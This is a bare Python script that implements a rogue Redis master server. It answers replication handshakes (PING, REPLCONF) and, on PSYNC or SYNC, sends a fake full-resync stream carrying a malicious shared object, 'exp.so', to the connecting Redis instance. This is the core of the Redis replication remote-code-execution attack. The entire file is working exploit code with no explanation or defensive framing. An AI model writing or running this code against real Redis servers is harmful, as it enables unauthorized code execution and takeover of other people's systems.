import socket
import time

CRLF = "\r\n"
payload = open("exp.so","rb").read()
exp_filename = "exp.so"

def RogueServer(port):
	global CRLF
	global payload
	flag = True
	result = ""
	sock = socket.socket()
	sock.bind(("0.0.0.0", port))
	sock.listen(10)
	clientSock, address = sock.accept()
	while flag:
		data = clientSock.recv(1024).decode("utf-8")
		if "PING" in data:
			result = "+PONG"+CRLF
			clientSock.send(result.encode())
			flag = True
		elif "REPLCONF" in data:
			result = "+OK"+CRLF
			clientSock.send(result.encode())
			flag = True
		elif "PSYNC" in data or "SYNC" in data:
			result = "+FULLRESYNC "+"a"*40+" 1"+CRLF
			result += "$"+str(len(payload))+CRLF
			result = result.encode()
			result += payload
			result += CRLF.encode()
			clientSock.send(result)
			flag = False

if __name__ == "__main__":
	port = 6380
	RogueServer(port)
